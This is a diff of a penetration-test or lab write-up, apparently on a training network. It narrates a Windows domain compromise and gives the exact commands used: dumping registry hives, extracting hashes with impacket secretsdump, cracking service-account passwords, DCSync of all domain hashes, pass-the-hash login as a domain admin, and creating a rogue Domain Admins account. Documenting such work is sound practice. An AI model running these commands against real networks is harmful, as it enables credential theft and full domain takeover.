@@ -165,13 +165,24 @@ reg save hklm\system system
 reg save hklm\security security
 ```
 
-As the connection to the server workstations was over evil-winrm, the consultant could use `download sam` to copy the local file back to the attackbox. With the hives copied back, another script from impacket, secretsdump, was used to extract hashes and stored credentials: `python3.9 /opt/impacket/examples/secretsdump.py -sam sam -system system -security security local`. With this, from the output from the hives on Server1, the password for the **svcBackup** user was discovered.
+As the connection to the server workstations was over evil-winrm, the consultant could use `download sam` to copy the local file back to the attackbox. With the hives copied back, another script from impacket, secretsdump, was used to extract hashes and stored credentials: `python3.9 /opt/impacket/examples/secretsdump.py -sam sam -system system -security security local`. With this, from the output from the hives on Server1, a password was discovered though it wasn't associated with a user:
 
-The svcBackup user had DC Sync rights [TODO], which meant all secrets of the domain could be dumped. This was done again with secretsdump: `proxychains python3.9 /opt/impacket/examples/secretsdump.py -just-dc svcbackups:[REDACTED]@10.200.116.102`. The result were the NTLM hashes for all CORP users, including T0 domain admins.
+```
+.....
+[*] _SC_SYNC
+(Unknown User):[REDACTED]
+[*] Cleaning up...
+```
+
+This user was added to the password list and re-run with hashcat against the SPN hashes, where it was revealed to be the password for the user **svcBackup**.
+
+By examing the rights of svcBackup with `net user svcBackup /domain` and `net groups svcBackup /domain`, it was discovered they the DC Sync permission, which meant all secrets of the domain could be dumped. This was done again with secretsdump: `proxychains python3.9 /opt/impacket/examples/secretsdump.py -just-dc svcbackups:[REDACTED]@10.200.116.102`. The result were the NTLM hashes for all CORP users, including T0 domain admins.
 
 Using one of these DAs, T0_josh.sutton, the consultant gained access to the CORPDC server: `proxychains evil-winrm -u t0_josh.sutton -H [REDACTED] -i 10.200.116.102`. As a DA, and with full access to every machine in CORP, the CORP domain was at this point completely compromised.
 
 ## Stage 3: Compromising the Forest via the Root DC
+
+To gain direct access to the DC, a new user was created: `net user aquinas [redacted] /add` plus `net group "Domain Admins" aquinas /add`. This allowed the consultant to remote on to the domain with `proxychains remmina` or by opening a remote desktop session from the existing session on WRK1.
 
 ## Stage 4: Access to the Swift system and demonstrating impact
 
